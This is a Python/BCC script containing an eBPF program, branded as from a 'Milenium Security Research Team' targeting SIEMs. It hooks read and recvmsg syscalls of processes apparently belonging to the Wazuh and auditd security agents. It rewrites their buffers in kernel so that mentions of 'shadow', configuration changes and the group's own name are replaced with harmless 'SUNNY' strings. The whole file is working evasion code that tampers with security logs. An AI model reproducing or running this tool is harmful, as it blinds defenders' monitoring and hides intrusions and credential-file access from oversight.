#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║          eBPF Universal Redactor v7.2 — Verifier-Safe Edition            ║
║             Milenium Security Research Team | Target: SIEMs              ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

from bcc import BPF
import sys, time, signal
from datetime import datetime

# --- ANSI Renkleri ---
R, G, Y, C, B, RST = "\033[31m", "\033[32m", "\033[33m", "\033[36m", "\033[1m", "\033[0m"
DIM = "\033[2m"

PROGRAM = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/uio.h>

struct user_msghdr_local {
    void *msg_name; int msg_namelen;
    struct iovec *msg_iov; unsigned long msg_iovlen;
    void *msg_control; unsigned long msg_controllen;
    unsigned int msg_flags;
};

// Veriyi paketlemek için bir yapı tanımlıyoruz
struct data_t {
    char buf[512];
};

BPF_HASH(buffer_ptrs, u64, u64);

// Değeri (value) 512 byte olan tek bir girişlik dizi oluşturuyoruz
BPF_PERCPU_ARRAY(scratch_pad, struct data_t, 1);

static inline int manipulate_buffer(void *buf, int ret) {
    if (ret <= 10) return 0;

    u32 zero = 0;
    struct data_t *data = scratch_pad.lookup(&zero);
    if (!data) return 0;

    // Veriyi 512 byte'lık struct içine okuyoruz (Verifier artık mutlu)
    if (bpf_probe_read_user(&data->buf, sizeof(data->buf), buf) < 0) return 0;

    int found = 0;
    // Güvenli tarama (Döngü sınırlarına dikkat)
    #pragma unroll
    for (int i = 0; i < 400; i++) {
        // Hedef: config_change (küçük/büyük duyarsız)
        if ((data->buf[i] == 'C' || data->buf[i] == 'c') && (data->buf[i+1] == 'O' || data->buf[i+1] == 'o') &&
            (data->buf[i+2] == 'N' || data->buf[i+2] == 'n') && (data->buf[i+3] == 'F' || data->buf[i+3] == 'f')) {
            char m[] = "SUNNY_DAY    ";
            bpf_probe_write_user((void *)(buf + i), m, sizeof(m));
            found = 1;
        }

        // Hedef: "milenium" anahtarı
        if (data->buf[i] == 'm' && data->buf[i+1] == 'i' && data->buf[i+2] == 'l' && data->buf[i+3] == 'e') {
            char m2[] = "SUNNYDAY";
            bpf_probe_write_user((void *)(buf + i), m2, sizeof(m2));
            found = 1;
        }

        // Hedef: shadow (Kritik dosya izini sil)
        if (data->buf[i] == 's' && data->buf[i+1] == 'h' && data->buf[i+2] == 'a' && data->buf[i+3] == 'd') {
            char m3[] = "sunny_";
            bpf_probe_write_user((void *)(buf + i), m3, sizeof(m3));
            found = 1;
        }
    }
    return found;
}

static inline int is_target_agent() {
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    if (comm[0] == 'w' && comm[1] == 'a' && comm[2] == 'z') return 1;
    if (comm[0] == 'a' && comm[1] == 'u' && comm[2] == 'd') return 1;
    return 0;
}

// SYSCALL HOOKS
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    if (!is_target_agent()) return 0;
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 buf_ptr = (u64)args->buf;
    buffer_ptrs.update(&pid_tgid, &buf_ptr);
    return 0;
}
TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 *buf_ptr = buffer_ptrs.lookup(&pid_tgid);
    if (buf_ptr && manipulate_buffer((void *)*buf_ptr, args->ret))
        bpf_trace_printk("HIT_READ\\n");
    buffer_ptrs.delete(&pid_tgid);
    return 0;
}

TRACEPOINT_PROBE(syscalls, sys_enter_recvmsg) {
    if (!is_target_agent()) return 0;
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct user_msghdr_local m = {};
    if (bpf_probe_read_user(&m, sizeof(m), args->msg) < 0) return 0;
    struct iovec iov = {};
    if (bpf_probe_read_user(&iov, sizeof(iov), m.msg_iov) < 0) return 0;
    u64 buf_ptr = (u64)iov.iov_base;
    buffer_ptrs.update(&pid_tgid, &buf_ptr);
    return 0;
}
TRACEPOINT_PROBE(syscalls, sys_exit_recvmsg) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 *buf_ptr = buffer_ptrs.lookup(&pid_tgid);
    if (buf_ptr && manipulate_buffer((void *)*buf_ptr, args->ret))
        bpf_trace_printk("HIT_RECV\\n");
    buffer_ptrs.delete(&pid_tgid);
    return 0;
}
"""

def cleanup(sig, frame):
    print(f"\n{R}[!] Detaching probes... System cleaned.{RST}")
    sys.exit(0)

print(f"{B}{C}╔══════════════════════════════════════════════════════════════════════════╗")
print(f"║          eBPF Universal Redactor v7.2 — Verifier-Safe Mode               ║")
print(f"╚══════════════════════════════════════════════════════════════════════════╝{RST}")

b = BPF(text=PROGRAM)
print(f"{G}[+] VERIFIER PASSED! Deep Scan (512-byte) active.{RST}")
signal.signal(signal.SIGINT, cleanup)

while True:
    try:
        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
        now = datetime.now().strftime("%H:%M:%S")
        print(f"{DIM}{now:10}{RST} {Y}{task.decode():15}{RST} {C}{msg.decode():15}{RST} {R}[REDACTED]{RST}")
    except KeyboardInterrupt: cleanup(None, None)
    except Exception: pass
